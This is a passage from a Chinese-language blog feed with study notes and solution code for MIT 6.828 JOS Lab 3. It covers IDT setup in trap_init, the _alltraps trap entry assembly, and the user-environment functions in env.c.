T_SYSCALL)</span><br></pre></td></tr></table></figure><p>我们使用这两个宏创建了所有宏的入口，故所有中断都要跳转到_alltraps，同时每个中断入口的创建形式都一样，也就具有了实际上的<strong>中断统一入口</strong>。</p><p>在函数trap_init中，将刚刚写好的一系列入口，以函数指针的形式，写进中断描述符表。给宏<code>SETGATE</code>传函数名和对应的中断序号即可，在使用函数名之前，必须先声明函数，告诉连接器要使用来自另一个文件的<code>symbol</code>。如要初始化<code>Divide By 0</code>：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t_divide</span><span class="params">()</span></span>;</span><br><span class="line">SETGATE(idt[T_DIVIDE], <span class="number">0</span>, GD_KT, t_divide, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>最后我们的trap_init代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">trap_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">Segdesc</span> <span class="title">gdt</span>[];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">SETGATE(idt[T_DIVIDE], <span class="number">0</span>, GD_KT, t_divide, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DEBUG], <span class="number">0</span>, GD_KT, t_debug, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_NMI], <span class="number">0</span>, GD_KT, t_nmi, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_BRKPT], <span class="number">1</span>, GD_KT, t_brkpt, <span class="number">3</span>);</span><br><span class="line">SETGATE(idt[T_OFLOW], <span class="number">1</span>, GD_KT, t_oflow, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_BOUND], <span class="number">0</span>, GD_KT, t_bound, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_ILLOP], <span class="number">0</span>, GD_KT, t_illop, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DEVICE], <span class="number">0</span>, GD_KT, t_device, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DBLFLT], <span class="number">0</span>, GD_KT, t_dblflt, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_TSS], <span class="number">0</span>, GD_KT, t_tss, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_SEGNP], <span class="number">0</span>, GD_KT, t_segnp, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_STACK], <span class="number">0</span>, GD_KT, t_stack, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_GPFLT], <span class="number">0</span>, GD_KT, t_gpflt, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_PGFLT], <span class="number">0</span>, GD_KT, t_pgflt, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_FPERR], <span class="number">0</span>, GD_KT, t_fperr, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_ALIGN], <span class="number">0</span>, GD_KT, t_align, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_MCHK], <span class="number">0</span>, GD_KT, t_mchk, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_SIMDERR], <span class="number">0</span>, GD_KT, t_simderr, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_SYSCALL], <span class="number">1</span>, GD_KT, t_syscall, <span class="number">3</span>);</span><br><span class="line"><span class="comment">// Per-CPU setup </span></span><br><span class="line">trap_init_percpu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>别忘记在前面声明函数。这样我们就建立起了IDT表，trap_init_percpu()中的<code>lidt(&amp;idt_pd);</code>正式加载IDT。但是此时中断还不能执行，我们还需要完成trapentry.S中的汇编代码。</p><p>从<code>_alltraps</code>开始，每个中断都会走过相同的代码。<code>Lab</code>要求我们在<code>_alltraps</code>中进行如下操作：</p><ol><li>让更多信息进栈，使得栈具有结构体<code>struct TrapFrame</code>的形式。</li><li>在寄存器<code>%ds, %es</code>的位置上放置宏<code>GD_KD</code>的值。</li><li>将当前栈指针压栈，给<code>trap</code>函数传参。</li><li>调用<code>trap</code>函数。</li></ol><p>总的来说，这段代码的意义就是正确的给trap函数传参，重点在把栈制作得和一个<code>struct TrapFrame</code>一样。</p><p>其实我们离答案很近。翻到上文的一张图片，可以发现，中断产生时，处理器已经自动压了一部分信息到栈上。</p><p>联系<code>struct TrapFrame</code>的声明，可以看到，从最后一个元素，寄存器<code>ss</code>的值，到结构体的第8个声明的属性<code>uintptr_t tf_eip</code>，处理器都已经压好了。在进入<code>_alltraps</code>之前，前面的代码还处理好了<code>error code</code>和<code>trap number</code>，现在仅剩<code>tf_ds, tf_es, tf_regs</code>需要处理。</p><p><code>Lab</code>讲义中说得很明确，要给<code>ds, es</code>寄存器传宏<code>GD_KD</code>的值，这又解决了一个问题。以上一瞬间解决了几乎所有需要处理的<code>struct TrapFrame</code>成员，可以写出前半部分代码如下。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">_alltraps:</span><br><span class="line">    pushl %ds</span><br><span class="line">    pushl %es</span><br></pre></td></tr></table></figure><p>剩下的<code>struct PushRegs</code>结构体，可以直接通过<code>popa</code>指令构造。<code>pusha</code>指令意为<code>push all registers</code>，将所有寄存器的值压栈，顺序正好对应<code>struct PushRegs</code>的声明顺序。</p><p>再接着将<code>GD_KD</code>的值赋值给寄存器<code>ds, es</code>，就可以调用<code>trap</code>函数了。完整代码如下：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">_alltraps:</span><br><span class="line">    pushl %ds</span><br><span class="line">    pushl %es</span><br><span class="line">    pushal</span><br><span class="line">    # load GD_KD into %ds, %es</span><br><span class="line">    movw $(GD_KD), %ax</span><br><span class="line">    movw %ax, %ds</span><br><span class="line">    movw %ax, %es</span><br><span class="line">    # pass a pointer to the trap frame for function trap</span><br><span class="line">    pushl %esp</span><br><span class="line">    call trap</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/08/05/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise4/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】Lab3-Exercise2</title>
      <link>https://billyotry.github.io/2021/08/03/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise2/</link>
      <guid>https://billyotry.github.io/2021/08/03/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise2/</guid>
      <pubDate>Tue, 03 Aug 2021 12:44:49 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;在env.c中完成env_init、env_setup_vm、region_alloc、load_icode、env_create、env_
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>在env.c中完成env_init、env_setup_vm、region_alloc、load_icode、env_create、env_run函数</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>env_init函数比较简单，就是遍历envs数组，将env_id字段置零，然后link字段更新下，只不过要注意顺序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">env_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Set up envs array</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = NENV - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line">envs[i].env_id = <span class="number">0</span>;</span><br><span class="line">envs[i].env_link = env_free_list;</span><br><span class="line">env_free_list = &amp;envs[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Per-CPU part of the initialization</span></span><br><span class="line">env_init_percpu();<span class="comment">//加载全局描述符表并且初始化段寄存器gs, fs, es, ds, ss</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是env_setup_vm函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">env_setup_vm(struct Env *e)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page for the page directory</span></span><br><span class="line"><span class="keyword">if</span> (!(p = page_alloc(ALLOC_ZERO)))</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now, set e-&gt;env_pgdir and initialize the page directory.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//    - The VA space of all envs is identical above UTOP</span></span><br><span class="line"><span class="comment">//(except at UVPT, which we&#x27;ve set below).</span></span><br><span class="line"><span class="comment">//See inc/memlayout.h for permissions and layout.</span></span><br><span class="line"><span class="comment">//Can you use kern_pgdir as a template?  Hint: Yes.</span></span><br><span class="line"><span class="comment">//(Make sure you got the permissions right in Lab 2.)</span></span><br><span class="line"><span class="comment">//    - The initial VA below UTOP is empty.</span></span><br><span class="line"><span class="comment">//    - You do not need to make any more calls to page_alloc.</span></span><br><span class="line"><span class="comment">//    - Note: In general, pp_ref is not maintained for</span></span><br><span class="line"><span class="comment">//physical pages mapped only above UTOP, but env_pgdir</span></span><br><span class="line"><span class="comment">//is an exception -- you need to increment env_pgdir&#x27;s</span></span><br><span class="line"><span class="comment">//pp_ref for env_free to work correctly.</span></span><br><span class="line"><span class="comment">//    - The functions in kern/pmap.h are handy.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">e-&gt;env_pgdir = (<span class="keyword">pte_t</span>*)page2kva(p);</span><br><span class="line">p-&gt;pp_ref++;</span><br><span class="line"><span class="built_in">memcpy</span>(e-&gt;env_pgdir, kern_pgdir, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// UVPT maps the env&#x27;s own page table read-only.</span></span><br><span class="line"><span class="comment">// Permissions: kernel R, user R</span></span><br><span class="line">e-&gt;env_pgdir[PDX(UVPT)] = PADDR(e-&gt;env_pgdir) | PTE_P | PTE_U;<span class="comment">//唯一需要修改的是UVPT需要映射到当前环境的页目录物理地址e-&gt;env_pgdir处，而不是内核的页目录物理地址kern_pgdir处</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的思路就是给e指向的Env结构分配页目录，并且继承内核的页目录结构，唯一需要修改的是UVPT需要映射到当前环境的页目录物理地址e-&gt;env_pgdir处，而不是内核的页目录物理地址kern_pgdir处。设置完页目录也就确定了当前用户环境线性地址空间到物理地址空间的映射</p><p>然后是region_alloc为用户环境分配物理空间，这里注意我们要先把起始地址和终止地址进行页对齐，对齐之后我们就可以以页为单位来分配内存，然后修改页目录表和页表：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">region_alloc(struct Env *e, <span class="keyword">void</span> *va, <span class="keyword">size_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// (But only if you need it for load_icode.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: It is easier to use region_alloc if the caller can pass</span></span><br><span class="line"><span class="comment">//   &#x27;va&#x27; and &#x27;len&#x27; values that are not page-aligned.</span></span><br><span class="line"><span class="comment">//   You should round va down, and round (va + len) up.</span></span><br><span class="line"><span class="comment">//   (Watch out for corner-cases!)</span></span><br><span class="line"><span class="comment">//round down va and round up va+len</span></span><br><span class="line"><span class="comment">//这样我们实际分配的地址就是va-xxx和va+len+xxx，这样就可以把va到va+len包含进去</span></span><br><span class="line"><span class="keyword">void</span> *begin = (<span class="keyword">void</span>*)ROUNDDOWN((<span class="keyword">uint32_t</span>)va,PGSIZE);</span><br><span class="line"><span class="keyword">void</span> *end = (<span class="keyword">void</span>*)ROUNDUP((<span class="keyword">uint32_t</span>)va+len,PGSIZE);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">void</span> *i = begin;i &lt; end; i+=PGSIZE)&#123; <span class="comment">//这里不需要等于，最后一页的最后地址就是end</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">pp</span> =</span> page_alloc(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(pp == <span class="literal">NULL</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;region_alloc(): allocation failed!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>((page_insert(e-&gt;env_pgdir,pp,i,PTE_W | PTE_U)) != <span class="number">0</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;region_allooc error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>load_icode 这里相当于实现一个ELF可执行文件加载器，ELF文件以一个ELF文件头开始，通过ELFHDR-&gt;e_magic字段判断该文件是否是ELF格式的，然后通过ELFHDR-&gt;e_phoff获取程序头距离ELF文件的偏移，ph指向的就是程序头的起始位置，相当于一个数组，程序头记录了有哪些Segment需要加载，加载到线性地址的何处？ph_num保存了总共有多少Segment。遍历ph数组，分配线性地址p_va开始的p_memsz大小的空间。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">load_icode(struct Env *e, <span class="keyword">uint8_t</span> *binary)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Hints:</span></span><br><span class="line"><span class="comment">//  Load each program segment into virtual memory</span></span><br><span class="line"><span class="comment">//  at the address specified in the ELF segment header.</span></span><br><span class="line"><span class="comment">//  You should only load segments with ph-&gt;p_type == ELF_PROG_LOAD.</span></span><br><span class="line"><span class="comment">//  Each segment&#x27;s virtual address can be found in ph-&gt;p_va</span></span><br><span class="line"><span class="comment">//  and its size in memory can be found in ph-&gt;p_memsz.</span></span><br><span class="line"><span class="comment">//  The ph-&gt;p_filesz bytes from the ELF binary, starting at</span></span><br><span class="line"><span class="comment">//  &#x27;binary + ph-&gt;p_offset&#x27;, should be copied to virtual address</span></span><br><span class="line"><span class="comment">//  ph-&gt;p_va.  Any remaining memory bytes should be cleared to zero.</span></span><br><span class="line"><span class="comment">//  (The ELF header should have ph-&gt;p_filesz &lt;= ph-&gt;p_memsz.)</span></span><br><span class="line"><span class="comment">//  Use functions from the previous lab to allocate and map pages.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  All page protection bits should be user read/write for now.</span></span><br><span class="line"><span class="comment">//  ELF segments are not necessarily page-aligned, but you can</span></span><br><span class="line"><span class="comment">//  assume for this function that no two segments will touch</span></span><br><span class="line"><span class="comment">//  the same virtual page.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  You may find a function like region_alloc useful.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Loading the segments is much simpler if you can move data</span></span><br><span class="line"><span class="comment">//  directly into the virtual addresses stored in the ELF binary.</span></span><br><span class="line"><span class="comment">//  So which page directory should be in force during</span></span><br><span class="line"><span class="comment">//  this function?</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  You must also do something with the program&#x27;s entry point,</span></span><br><span class="line"><span class="comment">//  to make sure that the environment starts executing there.</span></span><br><span class="line"><span class="comment">//  What?  (See env_run() and env_pop_tf() below.)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Elf</span>* <span class="title">header</span> =</span> (struct Elf*)binary;</span><br><span class="line"><span class="keyword">if</span>(header-&gt;e_magic != ELF_MAGIC)&#123;</span><br><span class="line">panic(<span class="string">&quot;load_icode(): The binary we load is not elf\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(header-&gt;e_entry == <span class="number">0</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;load_icode(): The elf file can&#x27;t be excuterd.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">e-&gt;env_tf.tf_eip = header-&gt;e_entry;</span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Proghdr</span> *<span class="title">ph</span>,*<span class="title">eph</span>;</span></span><br><span class="line">ph = (struct Proghdr*)((<span class="keyword">uint8_t</span>*)header + header-&gt;e_phoff);<span class="comment">//指向程序头，记录哪些seg需要加载等等</span></span><br><span class="line">eph = ph + header-&gt;e_phnum;<span class="comment">//seg的数量</span></span><br><span class="line"><span class="keyword">for</span>(;ph &lt; eph; ph++)&#123;</span><br><span class="line"><span class="keyword">if</span>(ph-&gt;p_type == ELF_PROG_LOAD)&#123;</span><br><span class="line"><span class="keyword">if</span>(ph-&gt;p_memsz &lt; ph-&gt;p_filesz)&#123;</span><br><span class="line">panic(<span class="string">&quot;load icode(): p_memsz &lt; p_filesz.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">region_alloc(e,(<span class="keyword">void</span>*)ph-&gt;p_va,ph-&gt;p_memsz);</span><br><span class="line">memmove((<span class="keyword">void</span> *)ph-&gt;p_va, binary + ph-&gt;p_offset, ph-&gt;p_filesz);</span><br><span class="line">        <span class="built_in">memset</span>((<span class="keyword">void</span> *)(ph-&gt;p_va + ph-&gt;p_filesz), <span class="number">0</span>, ph-&gt;p_memsz - ph-&gt;p_filesz);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">lcr3(PADDR(kern_pgdir));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now map one page for the program&#x27;s initial stack</span></span><br><span class="line"><span class="comment">// at virtual address USTACKTOP - PGSIZE.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">region_alloc(e,(<span class="keyword">void</span>*)USTACKTOP - PGSIZE,PGSIZE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>env_create 是利用env_alloc函数和load_icode函数，加载一个ELF文件到用户环境中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">env_create(<span class="keyword">uint8_t</span> *binary, <span class="keyword">enum</span> EnvType type)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span> </span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">if</span>(env_alloc(&amp;e,<span class="number">0</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;env_alloc(): env_alloc failed!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">load_icode(e,binary);</span><br><span class="line">e-&gt;env_type = type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>env_run函数执行e指向的用户环境</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">env_run(struct Env *e)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Step 1: If this is a context switch (a new environment is running):</span></span><br><span class="line"><span class="comment">//   1. Set the current environment (if any) back to</span></span><br><span class="line"><span class="comment">//      ENV_RUNNABLE if it is ENV_RUNNING (think about</span></span><br><span class="line"><span class="comment">//      what other states it can be in),</span></span><br><span class="line"><span class="comment">//   2. Set &#x27;curenv&#x27; to the new environment,</span></span><br><span class="line"><span class="comment">//   3. Set its status to ENV_RUNNING,</span></span><br><span class="line"><span class="comment">//   4. Update its &#x27;env_runs&#x27; counter,</span></span><br><span class="line"><span class="comment">//   5. Use lcr3() to switch to its address space.</span></span><br><span class="line"><span class="comment">// Step 2: Use env_pop_tf() to restore the environment&#x27;s</span></span><br><span class="line"><span class="comment">//   registers and drop into user mode in the</span></span><br><span class="line"><span class="comment">//   environment.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Hint: This function loads the new environment&#x27;s state from</span></span><br><span class="line"><span class="comment">//e-&gt;env_tf.  Go back through the code you wrote above</span></span><br><span class="line"><span class="comment">//and make sure you have set the relevant parts of</span></span><br><span class="line"><span class="comment">//e-&gt;env_tf to sensible values.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//panic(&quot;env_run not yet implemented&quot;);</span></span><br><span class="line"><span class="keyword">if</span>(curenv != <span class="literal">NULL</span> &amp;&amp; curenv-&gt;env_status == ENV_RUNNING)&#123;</span><br><span class="line">curenv-&gt;env_status = ENV_RUNNABLE;</span><br><span class="line">&#125;</span><br><span class="line">curenv = e;</span><br><span class="line">e-&gt;env_status = ENV_RUNNING;</span><br><span class="line">e-&gt;env_runs ++;</span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line">env_pop_tf(&amp;e-&gt;env_tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里如果没什么问题，当我们用gdb去调试会发现在int 0x30指令处出错了，那是因为我们还没实现，那是接下来的任务了。</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/08/03/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】JOS学习笔记 Lab3</title>
      <link>https://billyotry.github.io/2021/08/03/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab3/</link>
      <guid>https://billyotry.github.io/2021/08/03/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab3/</guid>
      <pubDate>Tue, 03 Aug 2021 09:03:54 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;在这个实验中，将实现操作系统的一些基本功能，来实现用户环境中的进程的正常运行。你将会加强JOS内核的功能，为它增添一些重要的数据结构，用来记录用户进程环境的一些信息；创建一个单一的用户环境，并且加载一个程序运行它。你也可以让JOS内核能够完成用户环境所作出的任何系统调用，以
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>在这个实验中，将实现操作系统的一些基本功能，来实现用户环境中的进程的正常运行。你将会加强JOS内核的功能，为它增添一些重要的数据结构，用来记录用户进程环境的一些信息；创建一个单一的用户环境，并且加载一个程序运行它。你也可以让JOS内核能够完成用户环境所作出的任何系统调用，以及处理用户环境产生的各种异常。</p><h2 id="Part-A-User-Environments-and-Exception-Handling"><a href="#Part-A-User-Environments-and-Exception-Handling" class="headerlink" title="Part A: User Environments and Exception Handling"></a>Part A: User Environments and Exception Handling</h2><p>新包含的文件inc/env.h里面包含了JOS内核的有关用户环境(User Environment)的一些基本定义。用户环境指的就是一个应用程序运行在系统中所需要的一个上下文环境，操作系统内核使用数据结构 Env 来记录每一个用户环境的信息。在这个实验中，我们只会创建一个用户环境，但是之后我们会把它设计成能够支持多用户环境，即多个用户程序并发执行。</p><p>在 kern/env.c 文件中我们看到，操作系统一共维护了三个重要的和用户环境相关的全局变量：</p><ul><li>struct Env *envs = NULL;        // All environments</li><li>struct Env *curenv = NULL;        // The current env</li><li>static struct Env *env_free_list;    // Free environment list</li></ul><p>一旦JOS启动，envs指针便指向了一个表示所有环境的Env结构数组。在我们的设计中，JOS内核将支持同一时刻最多 NENV 个活跃的用户环境，尽管这个数字要比真实情况下任意给定时刻的活跃用户环境数要多很多。系统会为每一个活跃的用户环境在envs链表中维护一个 Env 结构体。JOS内核也把所有不活跃的Env结构体，用env_free_list链接起来。这种设计方式非常方便进行用户环境env的分配和回收。内核也会把 curenv 指针指向在任意时刻正在执行的用户环境的 Env 结构体。在内核启动时，并且还没有任何用户环境运行时，curenv的值为NULL。</p><h3 id="Environment-State"><a href="#Environment-State" class="headerlink" title="Environment State"></a>Environment State</h3><p>我们要看一下，Env结构体每一个字段的具体含义是什么，Env结构体定义在 inc/env.h 文件中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Trapframe</span> <span class="title">env_tf</span>;</span><span class="comment">// Saved registers</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env_link</span>;</span><span class="comment">// Next free Env</span></span><br><span class="line"><span class="keyword">envid_t</span> env_id;<span class="comment">// Unique environment identifier</span></span><br><span class="line"><span class="keyword">envid_t</span> env_parent_id;<span class="comment">// env_id of this env&#x27;s parent</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">EnvType</span> <span class="title">env_type</span>;</span><span class="comment">// Indicates special system environments</span></span><br><span class="line"><span class="keyword">unsigned</span> env_status;<span class="comment">// Status of the environment</span></span><br><span class="line"><span class="keyword">uint32_t</span> env_runs;<span class="comment">// Number of times environment has run</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Address space</span></span><br><span class="line"><span class="keyword">pde_t</span> *env_pgdir;<span class="comment">// Kernel virtual address of page dir</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>env_tf</strong>：这个类型的结构体在inc/trap.h文件中被定义，里面存放着当用户环境暂停运行时，所有重要寄存器的值。内核也会在系统从用户态切换到内核态时保存这些值，这样的话用户环境可以在之后被恢复，继续执行。</p><p><strong>env_link</strong>：这个指针指向在env_free_list中，该结构体的后一个free的Env结构体。当然前提是这个结构体还没有被分配给任意一个用户环境时，该域才有用。</p><p><strong>env_id</strong>：这个值可以唯一的确定使用这个结构体的用户环境是什么。当这个用户环境终止，内核会把这个结构体分配给另外一个不同的环境，这个新的环境会有不同的env_id值。</p><p><strong>env_parent_id</strong>：创建这个用户环境的父用户环境的env_id</p><p><strong>env_type</strong>：用于区别出来某个特定的用户环境。对于大多数环境来说，它的值都是 ENV_TYPE_USER.</p><p><strong>env_status</strong>：这个变量存放以下可能的值</p><p>　　　　ENV_FREE: 代表这个结构体是不活跃的，应该在链表env_free_list中。</p><p>　　　　ENV_RUNNABLE: 代表这个结构体对应的用户环境已经就绪，等待被分配处理机。</p><p>　　　　ENV_RUNNING: 代表这个结构体对应的用户环境正在运行。</p><p>　　　　ENV_NOT_RUNNABLE: 代表这个结构体所代表的是一个活跃的用户环境，但是它不能被调度运行，因为它在等待其他环境传递给它的消息。</p><p>　　　　ENV_DYING: 代表这个结构体对应的是一个僵尸环境。一个僵尸环境在下一次陷入内核时会被释放回收。</p><p><strong>env_pgdir</strong>：这个变量存放着这个环境的页目录的虚拟地址</p><p>就像Unix中的进程一样，一个JOS环境中结合了“线程”和“地址空间”的概念。线程通常是由被保存的寄存器的值来定义的，而地址空间则是由env_pgdir所指向的页目录表还有页表来定义的。为了运行一个用户环境，内核必须设置合适的寄存器的值以及合适的地址空间。</p><h3 id="Allocating-the-Environments-Array"><a href="#Allocating-the-Environments-Array" class="headerlink" title="Allocating the Environments Array"></a>Allocating the Environments Array</h3><p>在lab 2，你在mem_init() 函数中分配了pages数组的地址空间，用于记录内核中所有的页的信息。现在你需要进一步去修改mem_init()函数，来分配一个Env结构体数组，叫做envs。</p><p>由于exercise1比较少，所以放在这里一起了</p><p>Exercise 1. 修改一下mem_init()的代码，让它能够分配envs数组。这个数组是由NENV个Env结构体组成的。envs数组所在的这部分内存空间也应该是用户模式只读的。被映射到虚拟地址UENVS处。</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">envs = (struct Env*)boot_alloc(NENV*<span class="keyword">sizeof</span>(struct Env));</span><br><span class="line"><span class="built_in">memset</span>(envs, <span class="number">0</span>, NENV * <span class="keyword">sizeof</span>(struct Env));</span><br></pre></td></tr></table></figure><p>分配完之后在页表中添加它的映射关系</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">boot_map_region(kern_pgdir, UENVS, PTSIZE, PADDR(envs), PTE_U);</span><br></pre></td></tr></table></figure><p>之前完后内核线性地址空间到物理地址空间的映射图如下：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab3/lab3_1_lab3%EF%BF%BD%EF%BF%BD%CA%BC%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D6%B7%EF%BF%BD%D5%BC%E4%B5%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D6%B7%EF%BF%BD%D5%BC%EF%BF%BD%D3%B3%EF%BF%BD%EF%BF%BD.png" alt="内存映射关系">)<img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab3/lab3_1_lab3%E5%BC%80%E5%A7%8B%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E5%88%B0%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E6%98%A0%E5%B0%84.png" alt="内存映射关系"></p><h3 